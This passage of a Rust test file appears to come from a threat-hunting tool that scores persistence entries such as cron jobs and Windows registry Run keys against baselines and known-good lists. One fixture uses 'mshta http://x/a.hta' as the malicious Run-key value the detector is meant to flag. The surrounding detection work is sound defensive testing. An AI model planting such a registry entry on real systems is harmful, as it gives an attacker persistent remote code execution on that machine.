    assert_eq!(r.os, Os::Linux);
    assert_eq!(r.state, State::Live);
    let r = normalize(0, &ev("L", "linux:cron:system_job", "System Cron: cd / && run-parts --report /etc/cron.hourly (File: /etc/crontab)", ""));
    assert_eq!(r.image, "run-parts");
    assert_eq!(r.family, DirFamily::Bare);
}

#[test]
fn known_good_matches_across_users_and_drives() {
    let mut kg = KnownGood::default();
    let clean = normalize(0, &ev("CLEAN", "windows:persistence:registry_run_key", "D:\\Users\\alice\\AppData\\Roaming\\Corp\\agent.exe --tray", ""));
    kg.insert_canon(clean.canon.clone());
    let same = normalize(0, &ev("WS01", "windows:persistence:registry_run_key", "C:\\Users\\bob\\AppData\\Roaming\\Corp\\agent.exe --tray", ""));
    assert!(kg.contains(&same));
    let other = normalize(0, &ev("WS01", "windows:persistence:registry_runonce_key", "C:\\Users\\bob\\AppData\\Roaming\\Corp\\agent.exe --tray", ""));
    assert!(!kg.contains(&other), "a different technique is a different entry");
}

#[test]
fn verdicts_line_up_with_events_after_sorting() {
    diag::clear();
    let mut events = vec![
        ev("H", "windows:persistence:registry_run_key", "mshta http://x/a.hta", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:registry_run_key", "C:\\Windows\\system32\\SecurityHealthSystray.exe", "2026-01-28 12:00:00.000"),
    ];
    events.sort_by(|a, b| a.timestamp.cmp(&b.timestamp));
    let (v, _) = evaluate(&events, &HuntSettings::default());
    assert_eq!(v.len(), 2);
    assert_eq!(v[0].hunt, Hunt::Habitual);
    assert_eq!(v[1].hunt, Hunt::Significant);
}

#[test]
fn single_host_without_baseline_is_not_evaluated_and_says_why() {
    diag::clear();
    let events = vec![
        ev("H", "windows:persistence:registry_run_key", "\"C:\\Program Files\\Vendor\\tool.exe\" /tray", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:registry_run_key", "C:\\Windows\\system32\\SecurityHealthSystray.exe", "2026-10-28 12:00:00.000"),
    ];
    let (v, r) = evaluate(&events, &HuntSettings::default());
    assert_eq!(v[0].hunt, Hunt::NotEvaluated, "{:?}", v[0]);
    assert_eq!(v[0].hunt_score(), "0");
    assert_eq!(v[0].score, 0);
    assert_eq!(v[0].hunt_why(), "not evaluated: one host and no baseline");
    assert_eq!(v[1].hunt, Hunt::Habitual);
    assert_eq!(r.not_evaluated, 1);
    assert_eq!(r.tested, 0);
    assert!(diag::has("ERR_HUNT_SINGLE_HOST"));
}
